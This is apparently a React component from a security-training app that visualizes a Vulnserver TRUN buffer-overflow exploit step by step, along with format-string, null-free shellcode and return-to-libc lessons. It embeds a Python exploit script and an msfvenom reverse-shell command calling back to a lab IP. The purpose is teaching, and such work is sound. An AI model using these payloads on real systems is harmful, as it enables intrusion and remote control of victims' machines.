import { useState } from 'react';
import { Cpu, Layers, Code2, Zap, ArrowRight, Play, RotateCcw, Shield } from 'lucide-react';
import { sfx } from '@/utils/soundEngine';
import { motion, AnimatePresence } from 'framer-motion';

const BOF_STAGES = [
  {
    stage: 1,
    name: 'Spiking',
    desc: 'Send unique patterns to each command to identify vulnerable parameter',
    command: 'TRUN .' + 'A'.repeat(3000),
    register: 'EAX: 00000000',
    detail: 'Sending 3000 "A" chars to TRUN command. Server crashes — TRUN is vulnerable to buffer overflow.',
  },
  {
    stage: 2,
    name: 'Fuzzing',
    desc: 'Send increasing payloads to find crash threshold (~2700 bytes)',
    command: 'TRUN .' + 'A'.repeat(2700),
    register: 'EIP: 41414141',
    detail: 'At ~2700 bytes, EIP overwrites to 41414141 (AAAA). Buffer size confirmed.',
  },
  {
    stage: 3,
    name: 'Pattern Offset',
    desc: 'Use Metasploit pattern_create/pattern_offset to find exact EIP offset (2003 bytes)',
    command: 'pattern_create.rb -l 2700\npattern_offset.rb -q 386F4337\n→ EIP offset: 2003',
    register: 'EIP: 386F4337 → offset 2003',
    detail: 'Cyclic pattern sent. EIP = 386F4337. pattern_offset.rb finds exact offset: 2003 bytes.',
  },
  {
    stage: 4,
    name: 'EIP Overwrite',
    desc: 'Confirm offset with 2003 A\'s + 4 B\'s (42424242)',
    command: 'TRUN .' + 'A'.repeat(2003) + 'BBBB',
    register: 'EIP: 42424242 ✓ CONFIRMED',
    detail: 'EIP now = 42424242 (BBBB). Exact control of Instruction Pointer confirmed at offset 2003.',
  },
  {
    stage: 5,
    name: 'Bad Characters',
    desc: 'Identify characters that break the payload (\\x00, \\x0a, \\x0d)',
    command: '!mona bytearray -b "\\x00\\x0a\\x0d"\n!mona compare -f bytearray.bin',
    register: 'Bad chars: \\x00 \\x0a \\x0d',
    detail: 'Mona generates byte array excluding \\x00, \\x0a, \\x0d. Compare finds bad chars that truncate payload.',
  },
  {
    stage: 6,
    name: 'JMP ESP',
    desc: 'Find JMP ESP gadget in essfunc.dll for reliable EIP redirect',
    command: '!mona jmp -r esp -cpb "\\x00\\x0a\\x0d"\n→ 0x625011af (essfunc.dll)',
    register: 'EIP → 0x625011af (JMP ESP)',
    detail: 'JMP ESP at 0x625011af in essfunc.dll. Little Endian: \\xaf\\x11\\x50\\x62. No ASLR on this DLL.',
  },
  {
    stage: 7,
    name: 'NOP Sled + Shellcode',
    desc: 'Add NOP sled (\\x90×32) + msfvenom reverse shell payload',
    command: 'msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b "\\x00\\x0a\\x0d" -f python',
    register: 'Shell: 351 bytes (x86/shikata_ga_nai)',
    detail: 'NOP sled + encoded reverse shell. msfvenom generates 351-byte payload. nc -lvnp 4444 ready to catch shell.',
  },
];

const EXPLOIT_SCRIPT = `#!/usr/bin/env python3
# AegisAI Buffer Overflow Exploit — Vulnserver TRUN
import socket, struct, sys

TARGET = "10.10.10.5"
PORT = 9999
OFFSET = 2003
JMP_ESP = struct.pack("<I", 0x625011af)  # essfunc.dll
BADCHARS = b"\\x00\\x0a\\x0d"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 \\
#   LPORT=4444 -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f python
shellcode = b"\\xda\\xd3\\xd9\\x74\\x24\\xf4\\x5b\\x53\\x31\\xc9"
shellcode += b"\\xb1\\x52\\x83\\xeb\\xfc\\x31\\x43\\x0e\\x03\\x96"
# ... (351 bytes total)
shellcode += b"\\x90" * 8  # encoder padding

nop_sled = b"\\x90" * 32
padding = b"A" * OFFSET

payload = b"TRUN ." + padding + JMP_ESP + nop_sled + shellcode + b"\\r\\n"

print(f"[*] Sending {len(payload)} bytes to {TARGET}:{PORT}")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TARGET, PORT))
sock.send(payload)
sock.close()
print("[*] Payload sent. Check: nc -lvnp 4444")`;

const MEMORY_SEGMENTS = [
  { name: 'Text', addr: '0x08048000', size: '0x1000', dir: 'static', color: 'cyan', desc: 'Executable code segment (read-only, +rx)' },
  { name: 'Data', addr: '0x08049000', size: '0x1000', dir: 'static', color: 'cyan', desc: 'Initialized global variables' },
  { name: 'BSS', addr: '0x0804A000', size: '0x1000', dir: 'static', color: 'cyan', desc: 'Uninitialized globals (zero-filled)' },
  { name: 'Heap', addr: '0x5678ABCD', size: 'dynamic', dir: 'up', color: 'amber', desc: 'malloc/free — grows upward (use-after-free target)' },
  { name: 'Stack', addr: '0xBFFFF000', size: 'dynamic', dir: 'down', color: 'crimson', desc: 'Local vars, return addr — grows downward (overflow target)' },
];

const FORMAT_STRING_STEPS = [
  { input: 'AAAA%08x.%08x.%08x.%08x', output: 'AAAA41414141.b7fb5000.00000001.bffff704', note: 'Leaking stack memory via %08x' },
  { input: 'AAAA%4$n', output: 'Writes 4 (bytes printed) to address 0x41414141', note: '%n writes to memory at stack-leaked address' },
  { input: 'Target: GOT entry for printf()', output: 'Overwrite GOT[printf] → system()', note: 'Now calling printf() actually calls system()' },
];

export function MemoryWorkspace({ onCaptureFlag }: { onCaptureFlag?: (flagId: string) => void }) {
  const [stage, setStage] = useState(0);
  const [running, setRunning] = useState(false);
  const [showScript, setShowScript] = useState(false);
  const [subTab, setSubTab] = useState<'bof' | 'format' | 'shellcode'>('bof');

  const runStage = (idx: number) => {
    setStage(idx);
    setRunning(true);
    sfx.whoosh();
    setTimeout(() => setRunning(false), 800);
  };

  const current = BOF_STAGES[stage];

  return (
    <div className="flex h-full overflow-auto p-2">
      <div className="w-full space-y-2">
        {/* Sub-tabs */}
        <div className="flex items-center gap-1">
          {[
            { id: 'bof' as const, label: 'Buffer Overflow Visualizer (Vulnserver TRUN)', icon: Cpu },
            { id: 'format' as const, label: 'Format String & GOT Overwrite (0x300)', icon: Code2 },
            { id: 'shellcode' as const, label: 'Null-Free Shellcode & return-to-libc (0x500-0x600)', icon: Zap },
          ].map((t) => {
            const Icon = t.icon;
            return (
              <button
                key={t.id}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-semibold border transition-all ${
                  subTab === t.id ? 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30' : 'bg-obsidian-850 text-slate-500 border-obsidian-700 hover:text-slate-300'
                }`}
                onClick={() => { setSubTab(t.id); sfx.tab(); }}
              >
                <Icon size={12} /> <span className="hidden lg:inline">{t.label}</span>
              </button>
            );
          })}
        </div>

        {subTab === 'bof' && (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-2">
            {/* Stage navigator */}
            <div className="panel overflow-hidden">
              <div className="panel-header">
                <Layers size={12} className="text-cyan-400" />
                7-Stage Exploit
              </div>
              <div className="p-2 space-y-1">
                {BOF_STAGES.map((s, i) => (
                  <button
                    key={s.stage}
                    className={`w-full text-left p-2 rounded-md border transition-all ${
                      stage === i ? 'bg-cyan-500/10 border-cyan-500/40 text-cyan-400' :
                      i < stage ? 'bg-emerald-600/5 border-emerald-600/20 text-emerald-400/70' :
                      'bg-obsidian-800 border-obsidian-700 text-slate-500 hover:border-obsidian-600'
                    }`}
                    onClick={() => runStage(i)}
                  >
                    <div className="flex items-center gap-2">
                      <span className={`w-5 h-5 rounded text-[10px] font-bold flex items-center justify-center ${
                        stage === i ? 'bg-cyan-500/20 text-cyan-400' : i < stage ? 'bg-emerald-600/20 text-emerald-400' : 'bg-obsidian-700 text-slate-600'
                      }`}>{s.stage}</span>
                      <span className="text-xs font-semibold">{s.name}</span>
                    </div>
                    <div className="text-[9px] text-slate-600 mt-1 pl-7">{s.desc}</div>
                  </button>
                ))}
                <button className="btn-cyan w-full mt-2 flex items-center justify-center gap-1" onClick={() => { runStage(0); sfx.click(); }}>
                  <RotateCcw size={11} /> Reset
                </button>
              </div>
            </div>

            {/* Visualizer */}
            <div className="panel overflow-hidden">
              <div className="panel-header">
                <Cpu size={12} className="text-cyan-400" />
                Register & Memory Visualizer
              </div>
              <div className="p-3 space-y-3">
                <AnimatePresence mode="wait">
                  <motion.div
                    key={stage}
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-3"
                  >
                    <div className="terminal p-3 space-y-2">
                      <div className="text-[10px] text-slate-600 uppercase border-b border-obsidian-700 pb-1">Registers</div>
                      <div className="grid grid-cols-2 gap-1 text-[10px] font-mono">
                        <div className="flex justify-between"><span className="text-slate-500">EAX:</span> <span className="text-cyan-400">0x{Math.random().toString(16).slice(2, 10).toUpperCase().padStart(8, '0')}</span></div>
                        <div className="flex justify-between"><span className="text-slate-500">EBP:</span> <span className="text-amber-400">0xBFFFF8C0</span></div>
                        <div className="flex justify-between"><span className="text-slate-500">ESP:</span> <span className="text-cyan-400">0xBFFFF8D0</span></div>
                        <div className="flex justify-between"><span className="text-slate-500">EIP:</span> <span className={stage >= 4 ? 'text-crimson-400 font-bold' : 'text-slate-400'}>{current.register.split(': ')[1] || '0x080484AB'}</span></div>
                      </div>
                    </div>

                    {/* Stack visualization */}
                    <div className="terminal p-3 space-y-1">
                      <div className="text-[10px] text-slate-600 uppercase border-b border-obsidian-700 pb-1">Stack Layout</div>
                      {[
                        { label: 'Buffer (2700 bytes)', content: (stage >= 1 ? 'A'.repeat(40) + '...' : 'empty'), fill: (stage >= 1 ? 'bg-crimson-600/20 text-crimson-400' : 'bg-obsidian-800 text-slate-600') },
                        { label: 'EBP (4 bytes)', content: (stage >= 2 ? '\\x41\\x41\\x41\\x41' : '\\x00\\x00\\x00\\x00'), fill: (stage >= 2 ? 'bg-amber-600/20 text-amber-400' : 'bg-obsidian-800 text-slate-600') },
                        { label: 'EIP (4 bytes)', content: (stage >= 6 ? '\\xaf\\x11\\x50\\x62 (JMP ESP)' : stage >= 4 ? '\\x42\\x42\\x42\\x42 (BBBB)' : '\\x00\\x00\\x00\\x00'), fill: (stage >= 6 ? 'bg-emerald-600/20 text-emerald-400' : stage >= 4 ? 'bg-crimson-600/30 text-crimson-400' : 'bg-obsidian-800 text-slate-600') },
                        { label: 'NOP Sled (32 bytes)', content: (stage >= 7 ? '\\x90'.repeat(16) + '...' : '\\x00\\x00...'), fill: (stage >= 7 ? 'bg-cyan-600/20 text-cyan-400' : 'bg-obsidian-800 text-slate-600') },
                        { label: 'Shellcode (351 bytes)', content: (stage >= 7 ? '\\xda\\xd3\\xd9\\x74...' : '\\x00\\x00...'), fill: (stage >= 7 ? 'bg-emerald-600/20 text-emerald-400' : 'bg-obsidian-800 text-slate-600') },
                      ].map((row, i) => (
                        <div key={i} className={`p-1.5 rounded text-[9px] font-mono ${row.fill}`}>
                          <span className="text-slate-600 mr-2">{row.label}:</span>
                          {row.content}
                        </div>
                      ))}
                    </div>

                    <div className="panel p-3">
                      <div className="text-[10px] text-slate-500 uppercase mb-1">Stage {current.stage}: {current.name}</div>
                      <div className="text-xs text-slate-300">{current.detail}</div>
                      <div className="terminal p-2 mt-2 text-[10px] text-emerald-400 font-mono whitespace-pre-wrap">
                        $ {current.command}
                      </div>
                    </div>

                    <div className="flex gap-2">
                      {stage < 6 && (
                        <button className="btn-cyan flex-1 flex items-center justify-center gap-1" onClick={() => runStage(stage + 1)}>
                          <Play size={11} /> Next Stage
                        </button>
                      )}
                      {stage === 6 && (
                        <button className="btn-emerald flex-1 flex items-center justify-center gap-1" onClick={() => { runStage(7); setShowScript(true); sfx.success(); }}>
                          <Zap size={11} /> Execute Exploit
                        </button>
                      )}
                    </div>
                    {stage === 3 && (
                      <div className="flex items-center justify-between p-2 rounded bg-amber-600/5 border border-amber-600/20">
                        <span className="text-[9px] text-amber-500">CTF: EIP overwritten with 42424242 — flag discovered!</span>
                        <button
                          className="text-[9px] font-bold text-amber-500 hover:text-amber-400 transition-colors"
                          onClick={() => { if (onCaptureFlag) onCaptureFlag('flag-bof'); sfx.flagCapture(); }}
                        >
                          🚩 FLAG{AEGIS_EIP_42424242}
                        </button>
                      </div>
                    )}
                  </motion.div>
                </AnimatePresence>
              </div>
            </div>

            {/* Generated exploit script */}
            <div className="panel overflow-hidden">
              <div className="panel-header">
                <Code2 size={12} className="text-emerald-400" />
                Auto-Generated Python 3 Exploit
              </div>
              <div className="p-3">
                <div className="terminal p-3 text-[10px] text-emerald-400 font-mono whitespace-pre-wrap max-h-96 overflow-auto">
                  {showScript ? EXPLOIT_SCRIPT : '# Run all 7 stages to generate exploit script...\n# Click "Execute Exploit" after stage 7.'}
                </div>
                {showScript && (
                  <button className="btn-emerald w-full mt-2" onClick={() => { sfx.success(); }}>
                    Download exploit.py
                  </button>
                )}
              </div>
            </div>
          </div>
        )}

        {subTab === 'format' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-2">
            {/* Memory map */}
            <div className="panel overflow-hidden">
              <div className="panel-header">
                <Layers size={12} className="text-cyan-400" />
                0x300 — 5-Segment Memory Map
              </div>
              <div className="p-3 space-y-2">
                {MEMORY_SEGMENTS.map((seg) => (
                  <div key={seg.name} className={`p-3 rounded-md border ${
                    seg.color === 'crimson' ? 'bg-crimson-600/10 border-crimson-600/30' :
                    seg.color === 'amber' ? 'bg-amber-600/10 border-amber-600/30' :
                    'bg-cyan-600/10 border-cyan-600/20'
                  }`}>
                    <div className="flex items-center justify-between">
                      <span className={`text-sm font-bold ${
                        seg.color === 'crimson' ? 'text-crimson-400' : seg.color === 'amber' ? 'text-amber-400' : 'text-cyan-400'
                      }`}>{seg.name}</span>
                      <span className="text-[10px] font-mono text-slate-500">{seg.addr}</span>
                    </div>
                    <div className="text-[10px] text-slate-500 mt-1">{seg.desc}</div>
                    <div className="text-[10px] font-mono text-slate-600 mt-1">
                      {seg.dir === 'up' && '↑ grows upward'}
                      {seg.dir === 'down' && '↓ grows downward'}
                      {seg.dir === 'static' && '— static (fixed)'}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Format string exploit */}
            <div className="panel overflow-hidden">
              <div className="panel-header">
                <Code2 size={12} className="text-crimson-400" />
                Format String (%n) GOT Overwrite
              </div>
              <div className="p-3 space-y-3">
                <div className="text-[10px] text-slate-500">
                  The <code className="text-crimson-400">%n</code> format specifier writes the number of bytes printed so far to a memory address on the stack. Combined with stack leaks via <code className="text-crimson-400">%08x</code>, an attacker can overwrite the Global Offset Table (GOT) to hijack function calls.
                </div>
                {FORMAT_STRING_STEPS.map((step, i) => (
                  <div key={i} className="panel p-3">
                    <div className="text-[10px] text-slate-600 uppercase mb-1">Step {i + 1}</div>
                    <div className="terminal p-2 text-[10px] font-mono">
                      <div className="text-crimson-400">input: {step.input}</div>
                      <div className="text-amber-400 mt-1">output: {step.output}</div>
                    </div>
                    <div className="text-[10px] text-slate-400 mt-1">{step.note}</div>
                  </div>
                ))}
                <div className="panel p-3 border-emerald-600/20">
                  <div className="flex items-center gap-2 text-emerald-400 mb-2">
                    <Shield size={12} />
                    <span className="text-xs font-bold">Defenses</span>
                  </div>
                  <div className="space-y-1 text-[10px] text-slate-400">
                    <div>• <span className="text-emerald-400 font-mono">Full RELRO</span> — makes GOT read-only after relocation</div>
                    <div>• <span className="text-emerald-400 font-mono">-Wformat-security</span> — compiler warns on non-literal format strings</div>
                    <div>• <span className="text-emerald-400 font-mono">FORTIFY_SOURCE</span> — bounds-checks format string writes</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {subTab === 'shellcode' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-2">
            {/* Null-free shellcode comparison */}
            <div className="panel overflow-hidden">
              <div className="panel-header">
                <Zap size={12} className="text-crimson-400" />
                Null-Free Shellcode (0x500)
              </div>
              <div className="p-3 space-y-3">
                <div className="text-[10px] text-slate-500">
                  The byte <code className="text-crimson-400">\\x00</code> (null) terminates C strings, breaking shellcode injected via strcpy(). Null-free shellcode uses equivalent instructions that avoid null bytes.
                </div>
                <div className="grid grid-cols-2 gap-2">
                  <div className="panel p-3 border-crimson-600/20">
                    <div className="text-[10px] text-crimson-400 uppercase mb-1">Vulnerable (has \\x00)</div>
                    <div className="terminal p-2 text-[10px] font-mono text-crimson-400">
                      <div>mov eax, 0</div>
                      <div className="text-slate-600">; B8 00 00 00 00</div>
                      <div className="text-slate-600 mt-1">; Contains 4 null bytes!</div>
                      <div className="text-slate-600">; strcpy() stops at first \\x00</div>
                    </div>
                  </div>
                  <div className="panel p-3 border-emerald-600/20">
                    <div className="text-[10px] text-emerald-400 uppercase mb-1">Null-Free</div>
                    <div className="terminal p-2 text-[10px] font-mono text-emerald-400">
                      <div>xor eax, eax</div>
                      <div className="text-slate-600">; 31 C0</div>
                      <div className="text-slate-600 mt-1">; Zero bytes: none!</div>
                      <div className="text-slate-600">; Same result, no nulls</div>
                    </div>
                  </div>
                </div>
                <div className="panel p-3">
                  <div className="text-[10px] text-cyan-400 uppercase mb-1">Polymorphic XOR Encoding</div>
                  <div className="terminal p-2 text-[10px] font-mono text-cyan-400">
                    <div>xor key, key  ; generate dynamic key</div>
                    <div>decode_loop:</div>
                    <div>  xor [esi], key  ; decode byte</div>
                    <div>  inc esi</div>
                    <div>  loop decode_loop</div>
                    <div className="text-slate-600 mt-1">; Evades signature-based IDS</div>
                  </div>
                </div>
              </div>
            </div>

            {/* return-to-libc */}
            <div className="panel overflow-hidden">
              <div className="panel-header">
                <Shield size={12} className="text-emerald-400" />
                return-to-libc & NX/ASLR (0x600)
              </div>
              <div className="p-3 space-y-3">
                <div className="text-[10px] text-slate-500">
                  When the stack is Non-Executable (NX bit), injected shellcode cannot run. <span className="text-amber-400">return-to-libc</span> bypasses this by returning into existing executable code (libc functions like <code>system()</code>).
                </div>
                <div className="panel p-3">
                  <div className="text-[10px] text-amber-400 uppercase mb-1">return-to-libc Attack</div>
                  <div className="terminal p-2 text-[10px] font-mono text-amber-400">
                    <div>Buffer overflow → EIP = system()</div>
                    <div>Stack: [system_addr][exit_addr]["/bin/sh"]</div>
                    <div className="text-slate-600 mt-1">; No shellcode needed!</div>
                    <div>; Calls system("/bin/sh") directly</div>
                  </div>
                </div>
                <div className="panel p-3 border-emerald-600/20">
                  <div className="text-[10px] text-emerald-400 uppercase mb-1">Modern Mitigations</div>
                  <div className="space-y-2">
                    <div className="flex items-center gap-2">
                      <ArrowRight size={10} className="text-emerald-400" />
                      <span className="text-[10px] text-slate-400"><span className="text-emerald-400 font-mono">ASLR (64-bit)</span> — randomizes libc address space</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <ArrowRight size={10} className="text-emerald-400" />
                      <span className="text-[10px] text-slate-400"><span className="text-emerald-400 font-mono">Stack Canaries</span> — detect overflow before ret</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <ArrowRight size={10} className="text-emerald-400" />
                      <span className="text-[10px] text-slate-400"><span className="text-emerald-400 font-mono">CFI (Control-Flow Integrity)</span> — validates indirect branches</span>
                    </div>
                  </div>
                </div>
                <div className="panel p-3">
                  <div className="text-[10px] text-slate-600 uppercase mb-1">checksec Output</div>
                  <div className="terminal p-2 text-[10px] font-mono">
                    <div className="text-emerald-400">RELRO: Full ✓</div>
                    <div className="text-emerald-400">Stack Canary: Found ✓</div>
                    <div className="text-emerald-400">NX: Enabled ✓</div>
                    <div className="text-emerald-400">PIE: Enabled ✓</div>
                    <div className="text-emerald-400">ASLR: 64-bit ✓</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
